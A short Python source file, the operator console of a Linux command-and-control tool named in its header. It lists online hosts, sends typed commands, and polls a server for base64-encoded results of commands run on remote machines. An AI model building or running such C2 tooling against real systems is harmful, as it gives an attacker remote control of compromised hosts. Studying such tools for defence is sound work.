#encoding=utf-8
#作者：@破壳雏鸟
#项目地址：https://github.com/pkcn445/C2/PortableC2ForLinux_v0.1dev

from lib.basecli import *

def getrst(basefun):
    while True:
        try:
            data = post(url=basefun.get_rst,data={"pwd":basefun.pwd},timeout=5)
            if data.status_code == 200:
                data = loads(data.text)
                for _,i in data.items():
                    if isinstance(i,dict):
                        rst = i.get("data").get("data").split("'")[1]
                        rst = b64decode(rst).decode("utf-8")
                        print("\n命令：{} 执行结果 \n>->->\n{}<-<-<\n".format(i.get("data").get("cdm"),rst))
                    elif isinstance(i,str):
                        print("\n"+i+"\n")
            sleep(2)
        except:
            continue

def main():
    handle = BaseFunc()
    handle.get_online_host()
    Thread(target=getrst,args=(handle,)).start()
    try:
        while True:
            opt = input(">>>")
            if opt:
                handle.opt_deal(opt)
    except KeyboardInterrupt:
        print("用户退出！")
        sys.exit(-1)

if __name__ == "__main__":
    main()


